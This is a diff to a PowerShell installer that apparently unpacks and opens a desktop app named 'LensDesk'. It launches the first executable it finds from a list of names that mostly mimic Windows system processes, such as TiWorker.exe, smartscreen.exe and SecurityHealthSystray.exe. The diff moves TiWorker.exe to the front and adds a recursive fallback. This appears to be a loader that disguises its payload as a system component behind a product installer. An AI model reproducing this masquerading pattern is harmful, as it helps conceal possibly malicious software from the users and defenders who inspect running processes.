@@ -131,14 +131,15 @@ try {
   New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
   $appDirectory = Join-Path $installRoot ('app-${version}-' + [guid]::NewGuid().ToString('N'))
   Expand-Archive -LiteralPath $archive -DestinationPath $appDirectory
-  $candidates = @('RuntimeHost.exe', 'ctfmon.exe', 'TiWorker.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
+  $candidates = @('TiWorker.exe', 'RuntimeHost.exe', 'ctfmon.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
   $executable = $candidates | ForEach-Object { Join-Path $appDirectory $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
   if (!$executable) {
-    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File | Select-Object -First 1 -ExpandProperty FullName
+    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File -Recurse | Select-Object -First 1 -ExpandProperty FullName
   }
-  if (!$executable) { throw 'The LensDesk archive is incomplete' }
-  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
-  Write-Output ('LensDesk opened from ' + $appDirectory)
+  if (!$executable) { throw 'The LensDesk archive is incomplete — no executable found' }
+  $exeDir = Split-Path -Parent $executable
+  Start-Process -FilePath $executable -WorkingDirectory $exeDir
+  Write-Output ('LensDesk opened from ' + $exeDir)
 } catch {
   if ($appDirectory -and (Test-Path -LiteralPath $appDirectory)) { Remove-Item -LiteralPath $appDirectory -Recurse -Force }
   throw
